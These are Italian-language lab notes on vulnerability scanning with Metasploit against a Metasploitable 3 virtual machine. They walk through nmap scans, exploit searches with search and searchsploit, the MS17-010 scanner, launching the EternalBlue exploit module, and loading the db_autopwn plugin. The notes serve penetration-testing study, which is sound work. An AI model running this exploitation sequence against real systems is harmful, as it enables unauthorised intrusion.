# Vulnerability Scanning with MSF

<figure><img src="../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

Facciamo un piccolo scan degli IP nella rete e capiamo qual è quello attaccante (il .4 perché il .5 siamo noi):

```
sudo nmap -sn 10.10.10.1/24
```

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

```
service postgresql start
msfconsole
setg RHOSTS 10.10.10.4
workspace -a MS3 //metasploitable 3
db_nmap -sS -sV -O 10.10.10.4 //consente di fare uno scan dentro msf e imposta automaticamente i dati nel db msf.

```

<figure><img src="../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

```
hosts
services
```

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

## Trovare le vulnerabilità e moduli MSF per sfruttarle

### Dentro MSF: comando search

Ora come troviamo una vulnerabilità se presente per ogni versione presente in questo elenco di servizi?

Primo metodo cercando a mano ogni nome:

```
search type:exploit name:Microsoft IIS
```

<figure><img src="../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Però in questo caso i dati sono di versioni differenti però. Quindi o non è exploitabile la versione 7.5 presente sul server di IIS altrimenti può essere che non ci siano dei moduli su MSF che consentano di exploitarla

Altro esempio:

<figure><img src="../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Ma non si capisce se siano effettivamente compatibili con la versione

<figure><img src="../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Per Glassfish è corretto proviamo a usarlo e dobbiamo cambiare però il default payload da linux a windows dato che la vittima è windows 7:

<figure><img src="../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

Guardiamo l'info di questo modulo:

<figure><img src="../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

E possiamo vedere nella descrizione come funziona e che è compatibile con la versione di Glassfish installata sulla nostra vittima. Impostiabil il paylod per windows e la porta APP\_RPORT ossia l'application interface port, RPORT, SSL certificate, TARGETURI, USERNAME e infine il nostro IP LHOST e la porta su cui vogliamo ricevere la connessione

<figure><img src="../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Non abbiamo ancora fatto abbastanza enumeration per avere tutte queste informazioni però (es: TARGETURI e USERNAME), possiamo però capire la APP\_RPORT dalla scansione che abbiamo fatto, rivediamo i servizi scoperti con il comando services:

<figure><img src="../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

Ma ancora non sappiamo qual è la porta RPORT che vogliamo usare come target.

Ma ora torniamo indietro tanto questo era solo per farci capire.

<figure><img src="../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

### Da bash linux:  comando Searchsploit

Possiamo usare anche l'utility da cmd presente in Kali Linux chiamata Searchsploit. E possiamo limitare i risultati a solo agli exploit presenti come moduli su Metasploit (ma ce ne mostrerebbe anche altri):

```
searchsploit "Microsoft Windows SMB"
```

<figure><img src="../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

Questi sono tutti i vari exploit che trova senza alcuni filtro, per distinguere quelli che sono moduli di metasploit bisogna guardare che nel nome tra parentesi hanno "(Metasploit)"

Quindi per filtrare i risultati facciamo pipe e frep dell'expression (-e):

```
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit" //è case sensitive
```

<figure><img src="../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

Ci sono un po' di exploit ma ancora non sappiamo se sono compatibili con la versione del nostro target Windows 7 2008.

Alcuni nel titolo hanno il numero delle versioni compatibili come quello qua sopra di EternalBlue:

<figure><img src="../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

Che in realtà ha un modulo corrispondente in metasploit ed è l'ultimo in basso: SMB Remote Code Execution Scanner (MS17-010).

E per controllare se la versione è compatibile dobbiamo verificare in metasploit:

<figure><img src="../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Ed infatti l'exploit è il primo dell'elenco. Ma per verificare che l'exploit sia davvero compatibile con la nostra versione si può usare l'auxiliary module evidenziato sopra, che appunto consente di testare se il target è compatibile con l'exploit.

## Eternal Blue

### Test se target vulnerabile a Eternal Blue

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
use auxiliary/scanner/smb/smb_ms17_010
run
```

Vediamo che effettivamente è probabile che il target sia vulnerabile ad Eternal Blue. E ci da anche delle info sulla versione di windows e l'architettura

### Uso del modulo per l'exploit della vulnerabilità

```
use exploit/windows/smb/ms17_010_eternalblue
// il payload di default è per windows x64 quindi ci va bene
show options
run
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dovremmo settare LHOST e LPORT che in realtà LHOST è già corretto, mentre per LPORT ci basta aprire una connessione in ascolto su quella porta, che però ci aprirà in realtà in automatico il modulo.

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Tecnica: DB autopawn plugin

Un plugin molto utile per metasploit

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Identifica i moduli exploit per le porte aperte sul sistema, e fornisce una lista di tutti gli exploit disponibili per i servizi con porte aperte.

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
cd Downloads/
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
// Torniamo in metasploit
load db_autopawn
db_autopawn

```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dice che è deprecato perché non è più presente in metasploit framework ma dobbiamo configurarlo manualmente come abbiamo fatto noi.

### Utilizzo di DB autopawn in metasploit

```
db_autopwn -p -t -PI 445 //per SMB port come target
```

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Però come possiamo vedere ci propone anche exploti per samba che è linux, anche se noi sappiamo che è smb windows.

Bisognerebbe fare più ricerche sul SO target e poi capire il modulo corretto da usare.

## Utilizzo del comando analyze

Analizza il contenuto del database metasploit (host e services) e ci mostra una serie di exploit per le vulnerabilità presenti per host e servizi.

Il comando vulns invece ci mostra  le vulnerabilià con realtiva CVE.

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

